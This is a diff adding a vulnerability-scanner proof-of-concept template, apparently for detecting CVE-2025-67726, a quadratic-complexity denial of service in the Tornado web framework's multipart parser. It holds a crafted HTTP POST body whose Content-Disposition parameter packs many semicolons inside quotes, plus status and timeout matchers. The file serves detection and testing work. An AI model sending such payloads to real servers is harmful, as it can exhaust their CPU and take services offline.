@@ -1,0 +1,54 @@
+[info]
+author = "ave"
+description = "检测 Tornado Web 框架 multipart/form-data 参数解析二次方复杂度拒绝服务漏洞。攻击者通过发送包含大量引号内分号的 Content-Disposition 参数，可触发 O(n²) CPU 消耗，导致服务器长时间无响应。"
+id = "POC-AVE-2025-0352"
+name = "CVE-2025-67726 Tornado Multipart Quadratic DoS PoC"
+severity = "high"
+tags = ["ave-2025-0352"]
+vuln_id = [
+    "CVE-2025-67726",
+    "AVE-2025-0352",
+    "GHSA-jhmp-mqwm-3gq8",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+--1234\r
+Content-Disposition: form-data; x=";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"; name="files"; filename="a.txt"\r
+\r
+PoC\r
+--1234--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=1234"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    400,
+    413,
+    500,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "TimeoutError",
+    "timeout",
+    "timed out",
+    "slow",
+]
